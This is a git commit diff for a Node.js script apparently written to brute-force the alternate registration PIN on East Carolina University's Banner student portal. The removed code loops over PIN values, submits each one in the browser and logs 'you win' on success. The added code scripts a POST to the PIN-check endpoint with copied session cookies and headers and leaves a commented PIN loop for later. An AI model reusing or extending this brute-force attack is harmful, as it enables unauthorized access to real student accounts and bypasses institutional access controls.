09805642af5ffda3681a6d413763bdd0731b4100
Nathan Hernandez <email@nathanph.com>
2017-11-12 15:58:12 -0500

    Add request and setup basic idea

--- index.js
+++ index.js
@@ -1,25 +1,37 @@
-function stuff (password) {
-  if (document.getElementsByClassName('datadisplaytable').length > 0) {
-    console.log('you win')
-    console.log(i)
-    // window.open('https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin')
-  } else {
-    document.getElementById('apin_id').value = password
-    document.getElementsByTagName('form')[1].submit()
+const rp = require('request-promise')
+
+let options = {
+  'method': 'POST',
+  'uri': 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_CheckAltPin',
+  'form': {
+    // Like <input type="text" name="name">
+    'pin': '000000'
+  },
+  'headers': {
+    'Host': 'ssbprd-banner.ecu.edu',
+    'Connection': 'keep-alive',
+    'Content-Length': '10',
+    'Cache-Control': 'max-age=0',
+    'Origin': 'https://ssbprd-banner.ecu.edu',
+    'Upgrade-Insecure-Requests': '1',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'DNT': '1',
+    'Referer': 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Cookie': 'TESTID=set; SESSID=MDBINkg5NjA3NzMx; BIGipServerbanner_ssbprd_8888=810940938.47138.0000; TESTID=set; SESSID=REMwUFI4NjA3NzMx'
   }
 }
 
-function wait (ms) {
-  let start = new Date().getTime()
-  let end = start
-  while (end < start + ms) {
-    end = new Date().getTime()
-  }
-}
+rp(options)
+  .then((body) => {
+    console.log(body)
+  })
+  .catch((err) => {
+    console.error(err)
+  })
 
-for (let i = 396250; i < 396265; i++) {
-  this.document.location = 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin'
-  console.log(i)
-  wait(1000)
-  stop = window.onload = stuff(i)
-}
+// for (let pin = 396257; pin < 99999; pin++) {
+// }
